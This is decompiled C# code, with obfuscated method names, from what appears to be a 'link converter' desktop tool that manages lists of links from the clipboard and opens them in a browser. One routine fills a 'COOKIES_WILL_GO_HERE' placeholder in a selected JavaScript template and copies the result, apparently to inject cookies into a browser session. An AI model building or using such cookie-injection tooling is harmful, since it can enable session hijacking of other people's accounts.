	private void button6_Click(object sender, EventArgs e)
	{
		string text = Clipboard.GetText();
		if (!File.Exists("tempoooo"))
		{
			File.Create("tempoooo");
		}
		using (StreamWriter streamWriter = new StreamWriter("tempoooo"))
		{
			streamWriter.WriteLine(text);
			streamWriter.Close();
		}
		addlink("tempoooo");
		((Control)label3).set_Text(listBox1.get_Items().get_Count().ToString());
	}

	private void method_14(object sender, EventArgs e)
	{
		Clipboard.SetText(" ");
		for (int i = 0; i < listBox1.get_Items().get_Count(); i++)
		{
			if (listBox1.GetSelected(i))
			{
				string text = listBox1.get_Items().get_Item(i).ToString() + '\r' + '\n';
				Clipboard.SetText(text + Clipboard.GetText());
			}
		}
	}

	private void method_15(object sender, EventArgs e)
	{
		method_7();
	}

	private void method_16(object sender, EventArgs e)
	{
		method_8();
	}

	private void method_17(object sender, EventArgs e)
	{
	}

	private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
	{
	}

	private void about_Click(object sender, EventArgs e)
	{
		about about2 = new about();
		((Control)about2).Show();
	}

	private void method_18(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("http://linkconverter.blogspot.com/");
	}

	private void listBox1_MouseDoubleClick(object sender, MouseEventArgs e)
	{
		int selectedIndex = ((ListControl)listBox1).get_SelectedIndex();
		if (selectedIndex != -1)
		{
			string string_ = listBox1.get_Items().get_Item(selectedIndex).ToString();
			method_19(string_);
		}
	}

	private bool method_19(string string_6)
	{
		if (string_6 == "")
		{
			return false;
		}
		string text = "";
		for (int i = 0; i < Class1.int_0; i++)
		{
			if (((Control)comboBox1).get_Text() == class1_0[i].string_0)
			{
				text = class1_0[i].string_6;
				break;
			}
		}
		if (text == "")
		{
			return false;
		}
		text = text.Replace("COOKIES_WILL_GO_HERE", string_6);
		try
		{
			Clipboard.SetText(text);
			return true;
		}
		catch
		{
		}
		return false;
	}

	private void method_20(object sender, EventArgs e)
	{
		for (int i = 0; i < listBox1.get_Items().get_Count(); i++)
		{
			try
			{
				Process.Start(listBox1.get_Items().get_Item(i).ToString());
			}
			catch
			{
			}
		}
	}

	private void method_21(object sender, EventArgs e)
	{
		for (int i = 0; i < listBox1.get_Items().get_Count(); i++)
		{
			try
			{
				Process.Start(listBox1.get_Items().get_Item(i).ToString());
			}
			catch
			{
			}
		}
	}

	private void method_22(object sender, EventArgs e)
	{
	}

	private void button10_Click(object sender, EventArgs e)
	{
		button6_Click(null, null);
		button3_Click(null, null);
		((Control)button10).set_Enabled(false);
	}

	private void method_23(object sender, EventArgs e)
	{
		about_Click(null, null);
	}

	private void method_24(object sender, EventArgs e)
	{
	}

	private void ymfpwjlPB(object sender, EventArgs e)
	{
		string text = Clipboard.GetText();
		if (!File.Exists("tempoooo"))
		{
			File.Create("tempoooo");
		}
		using (StreamWriter streamWriter = new StreamWriter("tempoooo"))
		{
			streamWriter.WriteLine(text);
			streamWriter.Close();
		}
		addlink_without_clear("tempoooo");
		((Control)label3).set_Text(listBox1.get_Items().get_Count().ToString());
	}

	private void main_FormClosed(object sender, FormClosedEventArgs e)
	{
		Application.Exit();
	}

	private void jqvQvIxbp(object sender, EventArgs e)
	{
	}

	private void method_25(object sender, CancelEventArgs e)
	{
	}

	private void main_SizeChanged(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)((Form)this).get_WindowState() == 1)
		{
			((Control)this).Hide();
		}
	}

	private void reexDfjheh_MouseDoubleClick(object sender, MouseEventArgs e)
	{
		((Control)this).Show();
		((Form)this).set_WindowState((FormWindowState)0);
	}

	private void exitToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Invalid comparison between Unknown and I4
		DialogResult val = MessageBox.Show("Are you sure ,want to Exit " + ((Control)this).get_Text() + "?", "Exit", (MessageBoxButtons)1);
		if ((int)val == 1)
		{
			Application.Exit();
		}
	}

	private void aLLToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			Clipboard.SetText(((Control)textBox1).get_Text());
		}
		catch
		{
		}
	}

	private void oneOnlyToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (((Control)textBox1).get_Text() == "")
		{
			Clipboard.SetText(" ");
		}
		else if (((Control)textBox1).get_Text().Contains("\r\n"))
		{
			Clipboard.SetText(((Control)textBox1).get_Text().Substring(0, ((Control)textBox1).get_Text().IndexOf("\r\n")));
		}
		else
		{
			Clipboard.SetText(((Control)textBox1).get_Text());
		}
	}

	private void copyToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			clipboard_copy();
		}
		catch
		{
		}
	}

	private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
	{
		about_Click(null, null);
	}

	private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://www.alertpay.com/SendMoney.aspx");
	}

	private void method_26(object sender, PopupEventArgs e)
	{
	}

	private void javascriptForFirstOneToolStripMenuItem_Click(object sender, EventArgs e)
	{
		oneOnlyToolStripMenuItem_Click(null, null);
		method_19(Clipboard.GetText());
	}

	private void button3_TextChanged(object sender, EventArgs e)
	{
		if (!(((Control)button3).get_Text() == "Start") || int_0 <= 0)
		{
			return;
		}
		if (int_0 > 0)
		{
			thread_2 = new Thread((ThreadStart)delegate
			{
				method_1(((Control)comboBox1).get_Text(), ((Control)textBox1).get_Text());
			});
		}
		thread_2.Start();
	}

	private void button2_Click(object sender, EventArgs e)
	{
		try
		{
			Process.Start(Form2.website_link);
		}
		catch
		{
		}
	}

	private void contextMenuStrip2_Opening(object sender, CancelEventArgs e)
	{
	}

	private void button4_Click(object sender, EventArgs e)
	{
		listBox1.get_Items().Clear();
		((Control)textBox1).set_Text("");
		((Control)label1).set_Text("count:");
		((Control)label2).set_Text("Result:");
	}

	private void button8_Click(object sender, EventArgs e)
	{
		int selectedIndex = ((ListControl)listBox1).get_SelectedIndex();
		if (selectedIndex != -1 && selectedIndex != 0)
		{
			object obj = listBox1.get_Items().get_Item(selectedIndex);
			listBox1.get_Items().set_Item(selectedIndex, listBox1.get_Items().get_Item(selectedIndex - 1));
			listBox1.get_Items().set_Item(selectedIndex - 1, obj);
			((ListControl)listBox1).set_SelectedIndex(selectedIndex - 1);
		}
	}

	private void button9_Click(object sender, EventArgs e)
	{
		int selectedIndex = ((ListControl)listBox1).get_SelectedIndex();
		if (selectedIndex != -1 && selectedIndex != listBox1.get_Items().get_Count() - 1)
		{
			object obj = listBox1.get_Items().get_Item(selectedIndex);
			listBox1.get_Items().set_Item(selectedIndex, listBox1.get_Items().get_Item(selectedIndex + 1));
			listBox1.get_Items().set_Item(selectedIndex + 1, obj);
			((ListControl)listBox1).set_SelectedIndex(selectedIndex + 1);
		}
	}

	private void button7_Click(object sender, EventArgs e)
	{
		int selectedIndex = ((ListControl)listBox1).get_SelectedIndex();
		if (selectedIndex != -1)
		{
			listBox1.get_Items().RemoveAt(selectedIndex);
			try
			{
				((ListControl)listBox1).set_SelectedIndex(selectedIndex - 1);
			}
			catch
			{
				((ListControl)listBox1).set_SelectedIndex(0);
			}
		}
	}

	[CompilerGenerated]
	private void method_27()
	{
		method_1(((Control)comboBox1).get_Text(), ((Control)textBox1).get_Text());
	}
}
